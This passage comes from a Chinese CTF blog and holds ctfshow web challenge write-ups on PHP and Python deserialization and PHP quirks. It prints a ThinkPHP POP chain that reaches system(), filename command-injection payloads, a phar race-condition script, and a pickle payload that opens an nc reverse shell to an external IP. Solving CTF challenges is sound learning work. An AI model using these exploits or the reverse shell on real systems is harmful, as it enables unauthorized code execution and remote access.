class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files[]=<span class="keyword">new</span> Pivot();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data=<span class="keyword">array</span>(</span><br><span class="line">              <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">new</span> Request()</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">$this</span>-&gt;append=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// HTTPS代理标识</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IP代理获取标识</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URL伪静态后缀</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="keyword">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/b1e5b9bbf1e54113a6b7255809c8e9be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAcXFfNTMwNjM0MzY=,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> filter(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;checkevil()===<span class="literal">false</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        copy(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],md5(mt_rand()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        unlink(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过分析可以看到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可以直接执行 $this-&gt;filename;因此做命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="function"><span class="keyword">fn</span>=1.<span class="title">php</span></span>;tac%<span class="number">20</span>flag.php;</span><br></pre></td></tr></table></figure><h2 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h2><p>本题应该是通过phar和反序列化、竞争将admin传为true，并通过构造phar包进行竞争</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 23:17:44</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-06 00:52:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$fn</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="string">&#x27;1;tac fla?.ph?&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filecontent=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取phar包</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>上述是phar包构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-05-06 00:54:43</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-05-06 01:05:31</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line"><span class="comment">#读取phar包内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPhar</span>(<span class="params">phar</span>):</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(phar,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> p:</span><br><span class="line"><span class="keyword">return</span> p.read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写入phar包内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writePhar</span>(<span class="params">url,data</span>):</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;writing...&#x27;</span>)</span><br><span class="line">requests.post(url,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#触发unlink的phar反序列化</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unlinkPhar</span>(<span class="params">url,data</span>):</span></span><br><span class="line"><span class="keyword">global</span> success</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;unlinking...&#x27;</span>)</span><br><span class="line">res = requests.post(url,data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> success <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line">success = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">global</span> success</span><br><span class="line">url = <span class="string">&#x27;http://b49ae4f3-fdc9-4810-9cb1-d521dd9ce054.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">phar = getPhar(<span class="string">&#x27;phar.phar&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>  success <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">w = threading.Thread(target=writePhar,args=(url+<span class="string">&#x27;?fn=p.phar&#x27;</span>,phar))</span><br><span class="line">u = threading.Thread(target=unlinkPhar,args=(url+<span class="string">&#x27;?fn=phar://p.phar/test&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">w.start()</span><br><span class="line">u.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这位题目脚本，可以直接竞争出flag。</p><h2 id="web277-278"><a href="#web277-278" class="headerlink" title="web277~278"></a>web277~278</h2><p>本题通过看源码可以发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span><br></pre></td></tr></table></figure><p>从中可以看出本题考查python反序列化<br>看feng师傅博客：<br><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">python反序列化原理</a><br><a href="https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">python反序列化漏洞</a><br>模仿师傅的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFshow</span>():</span></span><br><span class="line"><span class="comment">#    def sw(self):</span></span><br><span class="line"><span class="comment">#     print(self.show)</span></span><br><span class="line"><span class="comment">#    def __init__(self,show):</span></span><br><span class="line"><span class="comment">#        self.show= show</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc 120.76.201.211 6000 -e /bin/sh&#x27;).read()&quot;</span>,))</span><br><span class="line"><span class="comment">#        return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;,))</span></span><br><span class="line"><span class="comment">#        return (os.system,(&#x27;&#x27;,))</span></span><br><span class="line"></span><br><span class="line">cs = CTFshow()</span><br><span class="line">ctf = pickle.dumps(cs)</span><br><span class="line"><span class="comment">#df = pickle.loads(ctf)</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(ctf))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web入门 php特性</title>
      <link href="/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A8%20php%E7%89%B9%E6%80%A7/"/>
      <url>/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A8%20php%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>一些函数绕过<br><a href="https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/index.html">PHP绕过姿势</a></p><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>通过数组绕过<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p>用小数进行绕过<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">4476.1</span></span><br></pre></td></tr></table></figure><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察点：正则表达式修饰符<br>拓展</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">i </span><br><span class="line">不区分(ignore)大小写</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">多(more)行匹配</span><br><span class="line">若存在换行\n并且有开始^或结束$符的情况下，</span><br><span class="line">将以换行为分隔符，逐行进行匹配</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abc\nabc&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/^abc$/m&quot;</span>;</span><br><span class="line">preg_match(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">特殊字符圆点 . 中包含换行符</span><br><span class="line">默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abggab\nacbs&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/b./s&quot;</span>;</span><br><span class="line">preg_match_all(<span class="variable">$preg</span>, <span 